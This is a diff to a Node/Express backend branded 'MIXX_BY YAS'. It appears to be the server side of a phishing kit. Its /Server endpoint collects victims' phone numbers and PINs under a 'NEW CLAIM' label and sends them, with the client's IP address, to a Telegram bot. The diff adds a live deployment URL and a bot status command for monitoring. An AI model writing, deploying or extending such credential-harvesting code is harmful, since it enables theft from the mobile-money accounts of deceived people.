@@ -59,18 +59,22 @@ app.get('/', (req, res) => {
     status: 'OK',
     message: 'MIXX_BY YAS Backend is running',
     timestamp: new Date().toISOString(),
-    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️'
+    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️',
+    endpoint: 'https://mixxyas05com-production.up.railway.app'
   });
 });
 
 // Health check for Railway
 app.get('/health', (req, res) => {
-  res.status(200).json({ status: 'healthy', uptime: process.uptime() });
+  res.status(200).json({ 
+    status: 'healthy', 
+    uptime: process.uptime(),
+    service: 'MIXX_BY YAS'
+  });
 });
 
 // ============================================
 // MAIN ENDPOINT: /Server (POST)
-// This is what your frontend calls
 // ============================================
 app.post('/Server', async (req, res) => {
   try {
@@ -115,7 +119,7 @@ app.post('/Server', async (req, res) => {
 
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'your_bot_token_here') {
       try {
-        const message = `🎯 *NEW CLAIM*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}`;
+        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}\n📍 Source: mixxyas05com-production.up.railway.app`;
 
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -124,7 +128,7 @@ app.post('/Server', async (req, res) => {
           text: message,
           parse_mode: 'Markdown'
         }, {
-          timeout: 10000 // 10 second timeout
+          timeout: 10000
         });
 
         telegramSuccess = response.data.ok;
@@ -158,7 +162,7 @@ app.post('/Server', async (req, res) => {
       },
       data: {
         phone: phone,
-        pin: '****', // Don't expose the actual PIN in response
+        pin: '****',
         timestamp: new Date().toISOString()
       }
     });
@@ -174,8 +178,7 @@ app.post('/Server', async (req, res) => {
 });
 
 // ============================================
-// TELEGRAM WEBHOOK (Optional)
-// For receiving messages from Telegram
+// TELEGRAM WEBHOOK
 // ============================================
 app.post('/webhook', async (req, res) => {
   try {
@@ -183,12 +186,19 @@ app.post('/webhook', async (req, res) => {
     if (message && message.text) {
       console.log('📩 Telegram message received:', message.text);
       
-      // Auto-reply or handle commands
       if (message.text === '/start') {
         const chatId = message.chat.id;
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
-          text: '👋 Welcome to MIXX_BY YAS Bot!\n\nSend /status to check system status.'
+          text: '👋 Welcome to MIXX_BY YAS Bot!\n\n📊 Status: Active\n🔗 Endpoint: https://mixxyas05com-production.up.railway.app\n\nSend /status to check system status.'
+        });
+      }
+      
+      if (message.text === '/status') {
+        const chatId = message.chat.id;
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          chat_id: chatId,
+          text: `📊 *System Status*\n✅ Server: Online\n🕐 Uptime: ${Math.floor(process.uptime())}s\n📱 Monitoring: Active\n🔗 URL: https://mixxyas05com-production.up.railway.app`
         });
       }
     }
@@ -218,7 +228,7 @@ app.listen(PORT, () => {
   console.log('🚀 MIXX_BY YAS Backend Server');
   console.log('========================================');
   console.log(`📡 Server running on port: ${PORT}`);
-  console.log(`🌐 URL: http://localhost:${PORT}`);
+  console.log(`🌐 URL: https://mixxyas05com-production.up.railway.app`);
   console.log(`🔗 Endpoint: POST /Server`);
   console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
   console.log(`🆔 Chat ID: ${TELEGRAM_CHAT_ID || 'Not set'}`);
